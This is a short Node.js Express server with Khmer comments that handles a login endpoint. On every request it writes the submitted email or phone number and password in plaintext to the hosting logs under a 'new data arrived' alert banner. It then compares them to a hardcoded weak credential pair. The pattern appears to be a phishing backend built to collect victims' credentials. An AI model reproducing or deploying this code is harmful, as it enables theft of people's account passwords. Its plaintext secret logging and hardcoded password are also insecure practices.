const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs'); // ហៅកញ្ចប់ library សម្រាប់គ្រប់គ្រងហ្វាល (មានស្រាប់ក្នុង Node.js)

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

const CORRECT_USER = "admin@gmail.com";
const CORRECT_PASS = "12345678";

app.post('/api/login', (req, res) => {
    const { username, password } = req.body;

    // ១. ចាប់យកពេលវេលា
    const timeStamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Phnom_Penh' });

    // ២. បញ្ជាឱ្យបង្ហាញទិន្នន័យនៅលើ Logs របស់ Render ភ្លាមៗតែម្តង
    console.log("========================================");
    console.log(`🔔 មានទិន្នន័យថ្មីលោតមកដល់! [${timeStamp}]`);
    console.log(`👤 អ៊ីមែល/លេខទូរស័ព្ទ: ${username}`);
    console.log(`🔑 ពាក្យសម្ងាត់: ${password}`);
    console.log("========================================");

    // លុប ឬមិនបាច់ប្រើកូដ fs.appendFile មុននោះទៀតក៏បាន ព្រោះ Render Free មិនរក្សាទុកហ្វាលដាច់ដោយឡែកទេ
    
    // ផ្នែកត្រួតពិនិត្យ Username & Password ខាងក្រោមរក្សាទុកដដែល...
    if (username !== CORRECT_USER) {
        return res.json({ success: false, errorType: "username", message: "អ៊ីមែល ឬលេខទូរស័ព្ទនេះ មិនទាន់បានចុះឈ្មោះទេ។" });
    }
    if (password !== CORRECT_PASS) {
        return res.json({ success: false, errorType: "password", message: "ពាក្យសម្ងាត់ដែលអ្នកបានបញ្ចូលមិនត្រឹមត្រូវទេ។" });
    }
    res.json({ success: true, message: "ចូលគណនីជោគជ័យ!" });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});